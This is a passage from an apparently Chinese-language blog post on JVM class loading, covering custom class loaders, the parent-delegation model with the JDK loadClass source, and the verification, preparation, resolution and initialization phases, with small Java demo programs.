                    <span class="token class-name">String</span> fileName <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">;</span>
                    <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>inputStream<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                    inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> instance <span class="token operator">=</span> myloader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"org.fenixsoft.classloading.ClassLoaderTest"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token keyword">instanceof</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>fenixsoft<span class="token punctuation">.</span>classloading<span class="token punctuation">.</span></span>ClassLoaderTest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h5><p>​        从java虚拟机的角度来看，只存在两种不同的类加载器：一种是启动类加载器（Bootstrap ClassLoader），该加载器是用C++实现的(这里仅限HotSpot)，是虚拟机的一部分，另外一种是其他所有的类加载器，又java实现，独立于虚拟机外部，并全部继承抽象类<code>java.lang.ClassLoader</code></p>
<p>​        从JDK1.2以来，Java一直保持着三层类加载器，双亲委派的类加载架构，尽管该架构，在java模块化系统出现了一些调整，但未改变主体架构。</p>
<blockquote>
<p> 下面我们来介绍什么是三层类加载器，什么是双亲委派。</p>
</blockquote>
<ol>
<li>启动类加载器（BootStrap Class Loader）<ol>
<li>只加载<code>&lt;JAVA_HOME&gt;/bin</code>目录下的文件</li>
<li>被-Xbootclasspath参数指定的路径下文件</li>
<li>按照文件名（rt.jar,tools.jar）可被识别的类库</li>
<li>启动类加载器无法被java程序直接调用，当自定义类加载器时，需要交给启动类加载器，使用null代替即可。</li>
</ol>
</li>
</ol>
<blockquote>
<p>通过<code>java.lang.Class.getClassLoader()方法作为示例</code></p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
    * Returns the class loader for the class.  Some implementations may use
    * null to represent the bootstrap class loader. This method will return
    * null in such implementations if this class was loaded by the bootstrap
    * class loader.
    *
    * &lt;p> If a security manager is present, and the caller's class loader is
    * not null and the caller's class loader is not the same as or an ancestor of
    * the class loader for the class whose class loader is requested, then
    * this method calls the security manager's &#123;@code checkPermission&#125;
    * method with a &#123;@code RuntimePermission("getClassLoader")&#125;
    * permission to ensure it's ok to access the class loader for the class.
    *
    * &lt;p>If this object
    * represents a primitive type or void, null is returned.
    *
    * @return  the class loader that loaded the class or interface
    *          represented by this object.
    * @throws SecurityException
    *    if a security manager exists and its
    *    &#123;@code checkPermission&#125; method denies
    *    access to the class loader for the class.
    * @see java.lang.ClassLoader
    * @see SecurityManager#checkPermission
    * @see java.lang.RuntimePermission
    */</span>
   <span class="token annotation punctuation">@CallerSensitive</span>
   <span class="token keyword">public</span> <span class="token class-name">ClassLoader</span> <span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token class-name">ClassLoader</span> cl <span class="token operator">=</span> <span class="token function">getClassLoader0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cl <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
           <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
       <span class="token class-name">SecurityManager</span> sm <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>sm <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">checkClassLoaderPermission</span><span class="token punctuation">(</span>cl<span class="token punctuation">,</span> <span class="token class-name">Reflection</span><span class="token punctuation">.</span><span class="token function">getCallerClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
       <span class="token keyword">return</span> cl<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li><p>扩展类加载器（Extension Class Loader）:</p>
<ol>
<li><p>这个类加载器是在类<code>sun.misc.Launcher&amp;ExtClassLoader</code>中以Java代码形式实现的</p>
</li>
<li><p>主要负责加载<code>&lt;JAVA_HOME&gt;/lib/ext</code>目录中</p>
</li>
<li><p>或者被<code>java.ext.dirs</code>系统变量所指定的路径中所有的类库</p>
</li>
<li><p>这是Java系统类库的扩展机制，也就是可以将具有通用性的类库放置在ext目录里扩展Java SE的功能</p>
<blockquote>
<p>不过在JDK9之后被模块化带来的天然扩展能力替代</p>
</blockquote>
</li>
<li><p>由于是Java编写的，开发者可直接调用</p>
</li>
</ol>
</li>
<li><p>应用程序类加载器（Application Class Loader）：</p>
<ol>
<li>在<code>sun.misc.Launcher$AppClassLoader</code>来实现的。</li>
<li>是ClassLoader.getSystemClassLoader()方法的返回值</li>
<li>负责加载用户路径（ClassPath）上所有的类库</li>
<li>可被直接调用，如果没有自己定义，它就是系统默认的类加载器</li>
</ol>
</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heg7kduuj30hy0g2gmo.jpg" alt="image-20220618151703298"></p>
<p>​        双亲委派模型要求：除了顶部的启动类加载器，剩下的类加载器都应有自己的父类加载器，这里的父类不是指继承，<code>通常</code>指的是组合，也就是复用父类加载器的代码。</p>
<blockquote>
<p>这里的通常是指:双亲委派模型并不是强制性约束，而是推荐的一种类加载器实现的最佳实现</p>
</blockquote>
<blockquote>
<p>双亲委派模型的工作流程：</p>
</blockquote>
<p>​        当类加载器受到类加载请求时，并不会自己直接尝试加载，而是交给父类加载器，所有的请求最终都应该到启动类加载器，如果父类反馈无法加载（搜索范围找不到所需的类），子类再自己去尝试加载。</p>
<blockquote>
<p>双亲委派的好处？</p>
</blockquote>
<p>​        一个好处就是可以让类也保持一种层级关系，比如<code>java.lang.Object</code>,每个类的超类，存放在<code>rt.jar</code>下，无论哪个类加载器加载，都会发送到启动类加载器加载，因此Object类在各种类加载器环境下都能保证是同一个类。</p>
<p>​        这里如果不使用双亲委派模型，就会导致类关系混乱。比如用各自不同的类加载器加载Object，系统中就会有不同的Object类。比如我们自己写一个Object类,或者一个String类，编译可以通过，但是无法运行，这也是一种强有力的保护措施。</p>
<blockquote>
<p>双亲委派的代码：</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span>
    <span class="token punctuation">&#123;</span>
  			<span class="token comment">// 只能有一个线程来加载</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// First, check if the class has already been loaded</span>
            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      	<span class="token comment">// 如果有父类加载器，用父类的</span>
                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
												<span class="token comment">// 用Bootstrap</span>
                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// ClassNotFoundException thrown if class not found</span>
                    <span class="token comment">// from the non-null parent class loader</span>
                <span class="token punctuation">&#125;</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// If still not found, then invoke findClass in order</span>
                    <span class="token comment">// to find the class.</span>
                    <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token comment">// this is the defining class loader; record the stats</span>
                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> c<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="破坏双亲委派模型"><a href="#破坏双亲委派模型" class="headerlink" title="破坏双亲委派模型"></a>破坏双亲委派模型</h5><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>​        确保class文件的二进制流数据符合java虚拟机规范，不会损害虚拟机。我们可以知道java编译器会先对代码进行格式检查，如果正确才编译成class文件，但是class文件并不一定是编译后的，也可以通过0,1直接在二进制编辑器中生成的，所以虚拟机需要再对该数据进行校验。</p>
<p>​        验证阶段一般分为：文件格式校验，元数据校验，字节码校验，符号引用校验。</p>
<ol>
<li><p>文件格式校验：</p>
<ol>
<li>该阶段只要检查文件版本，魔数，索引等一些规范数据是否正常</li>
<li>如果没有问题，字节流才被允许进入java虚拟机内存的方法区进行存储，也就是后面的阶段都是针对方法区的存储结构进行的，不会直接读取，操作字节流了。</li>
</ol>
</li>
<li><p>元数据校验：</p>
<ol>
<li>针对类的信息进行检查，比如父类信息，子类是否实现父类所有要求实现的方法。</li>
<li>保证符合《Java语义规范》</li>
</ol>
</li>
<li><p>字节码校验：</p>
<ol>
<li>这一部分是整个校验部分最复杂的，负责检查语义是否合法，比如类中的方法体，进行校验分析，保证不会损害虚拟机。</li>
<li>需要注意如果一个类型的方法体的字节码没有通过字节码验证，说明一定有问题，但如果验证通过了，也无法保证其一定安全。</li>
</ol>
<blockquote>
<p>这里引申一个概念：“停机问题”</p>
<blockquote>
<p>通俗的讲：通过程序去判断一个程序是否有问题是无法保证准确的。</p>
</blockquote>
</blockquote>
<ol start="3">
<li>后面因为设计团队不想在这个阶段花费太多的时间，JDK6之后javac编译器和虚拟机进行一项联合优化，把尽可能多的校验放在javac中，具体做法是在方法体Code属性的属性表新添加一个“StackMapTable”属性。以后虚拟机只检查它就好了，不过也有一定被篡改欺骗的风险。</li>
</ol>
</li>
<li><p>符合引用校验：        </p>
<ol>
<li>发生在虚拟机将符号引用变为直接引用的时候。</li>
<li>判断该类是否缺少或者被禁止访问它所需要的外部资源，例如外部类，方法，字段。</li>
<li>这里可以做一个优化，当一个程序运行的全部代码已经被反复的使用和验证后，则可以在生产环境使用<code>-Xverify:none</code>参数来关闭大部分的类校验措施，缩短虚拟机加载的时间。</li>
</ol>
</li>
</ol>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>​        这一阶段是正式为类中定义的静态变量（static修饰的）进行初始化零值，也就是类型的默认值。这一部分数据在JDK7之前是放在方法区的，后面类变量则会随着Class对象存放在堆中。</p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><blockquote>
<p>符号引用：可以指向没有加载到虚拟机中内容</p>
<p>直接引用：直接指向目标的指针，也就是必须是虚拟机内的</p>
</blockquote>
<p>​        将常量池中的符号引用变为直接引用。</p>
<h4 id="类或接口解析"><a href="#类或接口解析" class="headerlink" title="类或接口解析"></a>类或接口解析</h4><p>​        假设当前代码在A类中，需要将一个符号引用B解析为一个直接引用C，则解析需要以下三步。</p>
<ol>
<li>如果C不是一个数组类型，虚拟机会把代表B的全限定名交给A的类加载器去加载C类。</li>
<li>如果是数组，则按照第一步去加载元素类型。</li>
<li>如果上面都没问题，C已经是一个类或者接口了，但这个时候还需要进行符号引用验证，就是看是否有权限访问。<ol>
<li>如果可以访问说明肯定是下面三种情况的一种：<ol>
<li>C为public，且与A在同一个模块儿</li>
<li>C是public，但与A不在一个模块儿，但是 C允许A访问</li>
<li>C不是public，但是与D在同一个包</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 id="字段解析"><a href="#字段解析" class="headerlink" title="字段解析"></a>字段解析</h4><p>​        通俗的说现在我需要解析C类的一个变量，如果C类本身含有则直接返回直接引用，如果没有就从下向上到父类和接口中寻找，如果有则返回直接引用，如果没有则抛出<code>java.lang.NoSuchFieldError</code>，如果成功返回来了引用还需要判断有没有权限，如果没有则派出<code>java.lang.IllegalAccessError</code>异常。</p>
<p>​        而实际中如果父类和接口都有同名字段，则可能拒绝编译。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> text1 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">C</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 爆出：Reference to 'i' is ambiguous, both 'B.i' and 'A.i' match</span>
        <span class="token comment">// 无法编译</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">interface</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">extends</span> <span class="token class-name">B</span> <span class="token keyword">implements</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h4 id="方法解析"><a href="#方法解析" class="headerlink" title="方法解析"></a>方法解析</h4><p>​        与字段解析类似，解析符号引用方法，看是否本类是否有，如果有则返回直接引用，没有去父类找，如果还没有去看自己实现的接口与父接口有没有该方法，如果有说明该类是一个抽象类爆出<code>java.lang.ABstractMethodError</code>异常，否则返回<code>java.lang.NoSuchMethodError</code>,如果成功返回了，还得继续判断权限，如果没有返回：<code>java.lang.IllegalAccessError</code>.</p>
<h4 id="接口方法解析"><a href="#接口方法解析" class="headerlink" title="接口方法解析"></a>接口方法解析</h4><p>​        与方法解析类似。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>​        虚拟机开始正式执行类中编写的java程序代码。对静态代码块儿进行执行，对静态变量进行赋值。这里注意：静态代码块儿与静态变量优先级一致，谁在前面先执行谁。以下例子就能说明问题：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token comment">//Error:(13, 28) java: 非法前向引用 无法进行编译</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">static</span>  <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>虚拟机会保证子类初始化前，先将父类进行初始化。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> text1 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 2</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">B<span class="token punctuation">.</span>B</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span>  <span class="token keyword">int</span> <span class="token class-name">A</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">A</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">B</span> <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<ol>
<li>上述初始化过程其实是执行了生成的<code>&lt;clinit&gt;()</code>方法,它并不是必须的，如果类和接口没有静态代码块也没有静态变量赋值，就不会生成这个方法</li>
<li>接口没有静态代码块和静态变量，但是可以进行初始化值，所以也会生成<code>&lt;clinit&gt;()</code>方法，但是接口不同的是，初始化时只执行自己的<code>&lt;clinit&gt;()</code>方法，不会管父类的，只有使用父类定义变量时，才会使用。</li>
<li><strong>虚拟机需要保证，在多线程情况下，类的初始化只完成一次，所以进行同步加锁，只有一个线程去执行<code>&lt;clinit&gt;()</code>方法，其他线程阻塞，如果该方法持续很久，就会导致多线程一直阻塞这是很隐蔽的。！！！</strong></li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> text1 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">//会导致线程一直阻塞。</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"init DeadLoopClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>类加载</tag>
      </tags>
  </entry>
  <entry>
    <title>后端编译与优化</title>
